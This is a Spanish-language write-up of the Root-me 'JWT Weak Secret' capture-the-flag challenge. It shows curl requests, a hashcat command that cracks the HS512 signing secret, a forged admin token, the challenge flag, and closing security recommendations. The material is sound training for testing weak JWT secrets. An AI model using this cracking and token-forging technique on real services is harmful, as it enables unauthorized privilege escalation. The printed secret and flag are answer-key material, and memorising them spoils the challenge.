
# Root-me Write-up: JWT Weak Secret

## 1. Reconocimiento Inicial

Al acceder al endpoint `/hello`, el servidor nos da instrucciones claras: obtener un token en `/token` e intentar acceder a `/admin` mediante una petición `POST`.

```bash
curl -v http://challenge01.root-me.org/web-serveur/ch59/hello

```

## 2. Obtención del Token

Solicitamos el token al servidor:

```bash
curl -v http://challenge01.root-me.org/web-serveur/ch59/token

```

**Respuesta:**
`{"Here is your token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf...clcw"}`

## 3. Análisis del Token

Al decodificar el token (vía `jwt.io`), observamos los siguientes datos:

* **Header:** `{"alg": "HS512", "typ": "JWT"}`
* **Payload:** `{"role": "guest"}`

El servidor utiliza **HS512** (HMAC con SHA-512), un algoritmo simétrico. Esto significa que usa la **misma palabra secreta** para firmar y para verificar el token.

## 4. Ataque de Fuerza Bruta (Cracking)

A pesar de usar un algoritmo potente, si la palabra secreta es corta o común, puede ser crackeada. Guardamos el token en un archivo y usamos **Hashcat** o **John the Ripper** con un diccionario (como `rockyou.txt`).

**Comando con Hashcat:**

```bash
hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

```

* `-m 16500`: Código para JWT (HS256/HS384/HS512).

**Resultado:** Se identificó que la clave secreta es: `lol`.

## 5. Explotación (Privilege Escalation)

Con la llave secreta `lol`, ahora podemos generar nuestro propio token legítimo cambiando el rol de `guest` a `admin`.

1. Entramos en `jwt.io`.
2. Cambiamos el payload a: `{"role": "admin"}`.
3. En la sección "Verify Signature", introducimos el secreto: `lol`.
4. Copiamos el nuevo token generado.

## 6. Obtención de la Flag

Finalmente, enviamos el nuevo token al endpoint `/admin` usando el método `POST` y la cabecera `Authorization` correcta.

```bash
curl -X POST -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA" -v http://challenge01.root-me.org/web-serveur/ch59/admin

```

**Flag:** `PleaseUseAStrongSecretNextTime`

---

## Recomendaciones de Seguridad

* **Usar Secretos Complejos:** Las llaves para algoritmos HMAC deben tener una entropía alta (mínimo 64 caracteres aleatorios para HS512).
* **Algoritmos Asimétricos:** Siempre que sea posible, utilizar **RS256** o **ES256**, donde el servidor firma con una llave privada y solo expone una llave pública para verificación, eliminando el riesgo de que la llave de firma sea crackeada por fuerza bruta desde el token.

---

